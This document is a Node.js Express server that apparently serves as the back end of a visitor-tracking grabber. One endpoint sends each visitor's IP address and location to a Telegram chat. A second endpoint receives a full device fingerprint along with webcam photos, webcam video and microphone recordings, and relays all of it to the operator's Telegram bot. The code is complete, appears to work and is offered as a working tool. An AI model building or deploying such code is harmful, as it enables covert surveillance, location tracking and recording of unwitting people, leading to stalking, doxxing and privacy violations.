const express = require('express');
const cors = require('cors');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ================================================================
// SIMPLE TEXT SENDER (no truncation needed for minimal messages)
// ================================================================
async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
    });
    if (!res.ok) {
        const err = await res.json();
        console.error('❌ Telegram sendMessage failed:', err);
    }
}

// ================================================================
// ENDPOINT 1: PING – IMMEDIATE, ONLY IP + LOCATION
// ================================================================
app.post('/api/ping', async (req, res) => {
    try {
        const { ipData, timestamp } = req.body;

        // Build a micro‑message (just IP & city/country)
        let msg = '📡 New visitor\n';
        if (ipData) {
            msg += `IP: ${ipData.ip || 'N/A'}\n`;
            if (ipData.city) msg += `City: ${ipData.city}\n`;
            if (ipData.country_name) msg += `Country: ${ipData.country_name}\n`;
        }
        msg += `Time: ${timestamp || new Date().toISOString()}`;

        console.log(`[PING] IP: ${ipData?.ip}`);
        await sendTelegramMessage(msg);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Ping error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ================================================================
// ENDPOINT 2: FULL CAPTURE – AFTER CLICK (TEXT + MEDIA)
// ================================================================
app.post('/api/telegram', async (req, res) => {
    try {
        const { ipData, fingerprint, photo, video, mic, timestamp } = req.body;

        console.log(`[FULL] Received at ${timestamp}`);
        console.log(`[FULL] IP: ${ipData?.ip}`);
        console.log(`[FULL] Photo: ${photo ? 'yes' : 'no'}`);
        console.log(`[FULL] Video: ${video ? 'yes' : 'no'}`);
        console.log(`[FULL] Mic: ${mic ? 'yes' : 'no'}`);

        // Build a full fingerprint message (will be longer, but that's fine after the click)
        let msg = '📡 *Full Capture*\n\n';
        if (ipData) {
            msg += `*IP:* ${ipData.ip}\n`;
            if (ipData.city) msg += `City: ${ipData.city}\n`;
            if (ipData.region) msg += `Region: ${ipData.region}\n`;
            if (ipData.country_name) msg += `Country: ${ipData.country_name}\n`;
            if (ipData.org) msg += `ISP: ${ipData.org}\n`;
            msg += '\n';
        }
        if (fingerprint) {
            msg += `*Device:*\n`;
            msg += `UA: ${fingerprint.userAgent?.substring(0, 60) || 'N/A'}\n`;
            msg += `Platform: ${fingerprint.platform}\n`;
            msg += `Screen: ${fingerprint.screen?.width}x${fingerprint.screen?.height}\n`;
            msg += `Cores: ${fingerprint.hardwareConcurrency}\n`;
            msg += `Memory: ${fingerprint.deviceMemory} GB\n`;
            msg += `Touch: ${fingerprint.maxTouchPoints}\n`;
            msg += `Timezone: ${fingerprint.timezone}\n`;
            if (fingerprint.webgl?.renderer) {
                msg += `GPU: ${fingerprint.webgl.renderer.substring(0, 50)}\n`;
            }
            if (fingerprint.canvas) msg += `Canvas: captured\n`;
        }
        msg += `\n*Time:* ${timestamp}`;

        // Telegram accepts Markdown but the message length may be large; we keep it reasonable.
        // If the message is still too long, we split it.
        await sendMessageSafe(msg);

        // Media
        if (photo) await sendPhoto(photo);
        if (video) await sendVideo(video);
        if (mic) await sendAudio(mic);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Full capture error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ================================================================
// HELPER: SPLIT LONG MESSAGES (for the full capture)
// ================================================================
async function sendMessageSafe(text) {
    const MAX_BYTES = 3800;
    const buf = Buffer.from(text, 'utf8');
    console.log(`[DEBUG] Full message bytes: ${buf.length}`);

    if (buf.length <= MAX_BYTES) {
        await sendTelegramMessage(text);
        return;
    }

    let start = 0;
    let part = 1;
    const total = Math.ceil(buf.length / MAX_BYTES);
    while (start < buf.length) {
        let end = start + MAX_BYTES;
        if (end < buf.length) {
            while (end > start && (buf[end] & 0xC0) === 0x80) end--;
        }
        const chunkText = `[${part}/${total}] ` + buf.slice(start, end).toString('utf8');
        await sendTelegramMessage(chunkText);
        start = end;
        part++;
    }
}

// ================================================================
// HELPERS: SEND PHOTO, VIDEO, AUDIO
// ================================================================
async function sendPhoto(b64) {
    try {
        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
        const buffer = Buffer.from(base64Data, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'webcam.jpg');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } catch(e) { console.error('sendPhoto error:', e); }
}

async function sendVideo(b64) {
    try {
        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
        const buffer = Buffer.from(base64Data, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('video', new Blob([buffer], { type: 'video/mp4' }), 'webcam.mp4');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
    } catch(e) { console.error('sendVideo error:', e); }
}

async function sendAudio(b64) {
    try {
        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
        const buffer = Buffer.from(base64Data, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('audio', new Blob([buffer], { type: 'audio/wav' }), 'mic.wav');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
    } catch(e) { console.error('sendAudio error:', e); }
}

app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));